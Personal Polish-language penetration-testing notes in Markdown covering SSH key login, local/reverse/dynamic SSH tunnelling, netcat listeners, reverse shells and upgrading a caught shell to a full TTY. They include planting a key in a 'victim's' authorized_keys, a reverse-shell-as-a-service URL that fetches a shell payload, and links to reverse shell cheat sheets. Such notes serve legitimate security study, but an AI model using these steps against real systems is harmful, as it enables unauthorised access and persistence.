<!-- TOC -->

- [ssh](#ssh)
  - [autentykacja plikiem](#autentykacja-plikiem)
  - [SSH Port Forwarding (SSH Tunneling)](#ssh-port-forwarding-ssh-tunneling)
    - [LOCAL](#local)
    - [REVERSE](#reverse)
    - [DYNAMIC](#dynamic)
- [nc/netcat LISTENER](#ncnetcat-listener)
- [Reverse Shell as a Service](#reverse-shell-as-a-service)
- [reverse shell cheat sheet](#reverse-shell-cheat-sheet)
- [upgrade shell](#upgrade-shell)
- [Escape from Restricted Shells](#escape-from-restricted-shells)

<!-- /TOC -->
# ssh
połączenie ssh
https://unix.stackexchange.com/questions/23291/how-to-ssh-to-remote-server-using-a-private-key
```bash
ssh -p 1234 user@IP/Hostaname
```
<details>
<summary>PARAMETERS</summary>

`-i a.key` -klucz prywatny użytkownika utworzony na hoście zdalnym (jeśli istnieje to można go skopiować do siebie, oddzielny plik, zmienić chmod 600, dodać jako argument do ssh )  
`-p` port na którym się połączyć

</details>

## autentykacja plikiem 
można się zalogować nie wykonując .bashrc (plik uruchamiany przy starcie nowego terminala)
```bash
#wygenerować u siebie klucz RSA
(kck@kck)$ ssh-keygen -f <id_rsa>   
#nadać odpowiednie uprawnienia plikom
(kck@kck)$ chmod 600 ~/.ssh/nazwa (id_rsa domyślnie)
(kck@kck)$ chmod 600 ~/.ssh/nazwa.pub (id_rsa.pub domyślnie)
(kck@kck)$ chmod 700 ~/.ssh
#umieścić swój klucz publiczny w  ofiary pliku
(nazwa_ofiary@ofiara)$ nano ~/.ssh/authorized_keys 
# wykorzystanie klucza prywatnego do logowania bez hasła
(kck@kck)$ ssh -i <id_rsa> nazwa_ofiary@ofiara 
```
## [SSH Port Forwarding (SSH Tunneling)](https://www.ssh.com/academy/ssh/tunneling-example)
dobrze wytłumaczone różnice między forwardingiem ssh:  
https://phoenixnap.com/kb/ssh-port-forwarding#ftoc-heading-4  
[What is the difference between Local/Remote/Dynamic SSH tunneling?](https://serverfault.com/questions/272754/what-is-the-difference-between-local-remote-dynamic-ssh-tunneling)

https://www.youtube.com/watch?v=AtuAdk4MwWw

`-L` przekazuj to co wysyłam  
`-R` przekazuj to co odbieram

### LOCAL
**jeśli chcesz uzyskać dostęp do zdalnych zasobów**

**ssh -L 8181:IP:3389**  
przekieruj port 3389 na lokalnej maszynie przez port 8181 lokalnej maszyny do IP zdalnego hosta na port 3389
Dane zamiast portem 3389 będą transportowane przez port 8181 do IP na port 3389 hosta zdalnego 
ssh -L 8000:127.0.0.1:80 daniel@pandora 
WSZYSTKO CO WYŚLĘ NA PORT 8181 NA LOKALNEJ MASZYNIE (moje kali) MA ZOSTAĆ WYSŁANE POPRZEZ TUNEL NA 127.0.0.1, NA PORT 80, NA MASZYNIE PANDORA
```bash
ssh -L local_port:destination_server_ip:remote_port ssh_server_hostname
```

<details>
<summary>PARAMETERS</summary>

`ssh` – Starts the SSH client program on the local machine and establishes a secure connection to the remote SSH server.  
`-L local_port:destination_server_ip:remote_port` – The local port on the local client is being forwarded to the port of the destination remote server.  
`ssh_server_hostname` – This element of the syntax represents the hostname or IP address of the remote SSH server.
</details>

```bash
ssh –L 5901:188.17.0.5:4492 pnap@ssh.server.com
#-L -droga jaką ma przejść wysyłany pakiet danych:
#przez mój port 5901 dostarczyć do 188.17.0.5 na port 4492
```
In the example above, all traffic sent to port 5901 on your local host is being forwarded to port 4492 on the remote server located at 188.17.0.5.

### REVERSE
**jeśli chcesz dać dostęp do lokalnych zasobów**
```bash
ssh -R remote_port:localhost:local_port ssh_server_hostname
```
```bash
ssh –R 8080:localhost:5534 pnap@ssh.server.com
```
Przekazuj pakiety otrzymywane na port 8080 na adres localhost:5534, nie musi być koniecnzie localhost, może być inny zasób sieciowy dostępny tylko z wewnątrz sieci. odpowiedzi z localhost przekazuj przez swój port 8080 do hosta na drugim końcu tunelu

Jeśli na ssh.server.com wejdę przez przeglądarkę na adres localhost:8080 to pakiet zostanie wysłany przez port 8080 lokalnej maszyny (ssh.server.com) na port 8080 zdalnej maszyny (ta, która uruchomiła komendę) i tam przekazane z portu 8080 na docelowy port 5534

### DYNAMIC
tzw socks proxy
```bash
ssh –D local_port ssh_server_hostname
```
```bash
ssh –D 5534 pnap@ssh.server.com
```
You are now able to configure a local resource, like a browser, to use proxy localhost on port 5534. All traffic originating from that resource is directed through the SSH connections established for the defined port.
ustawienie przeglądarki żeby korzystała z proxy localhost:5534 sprawia, że wysyła wszystko do tunelu.

For dynamic forwarding to work, you would need to configure and enable each application for the SOCKS proxy server.


# nc/netcat LISTENER
```bash
#nasłuchuj połączenia
nc -lvp <port>
```

<details>
<summary>PARAMETERS</summary>

`-l` listen (nasłuchuj na porcie, czekaj na przychodzące poączenia)  
`-v` verbose  
`-p` numer portu  

</details>

```bash
# nawiąż połączenie z IP:PORT
nc -v IP PORT
```

# [Reverse Shell as a Service](https://reverse-shell.sh)
```bash
# reverse shell as a service
https://reverse-shell.sh/yourip:port 
```
https://github.com/lukechilds/reverse-shell
# reverse shell cheat sheet
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md



# upgrade shell
różne metody spawnu powłoki (nie tylko python)  
http://netsec.ws/?p=337
pełen upgrade
https://null-byte.wonderhowto.com/how-to/upgrade-dumb-shell-fully-interactive-shell-for-more-flexibility-0197224/
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")' # Spawn a Bash Shell
```
*CTRL-Z*
```bash
echo $TERM # own terminal info, zapisać jaki terminal
stty -a # own terminal info, zapisać ilość kolumn i wierszy
stty raw -echo && fg # allow to pass keyboard shortcuts through
```
*ENTER*
```bash
reset
export TERM=xterm-256color # albo inny, wcześniej zapisany
export SHELL=bash # ustawienie powłoki
stty rows <26> cols <105> # ustawienie kolumn i wierszy, wcześniej zapisanych
```

# Escape from Restricted Shells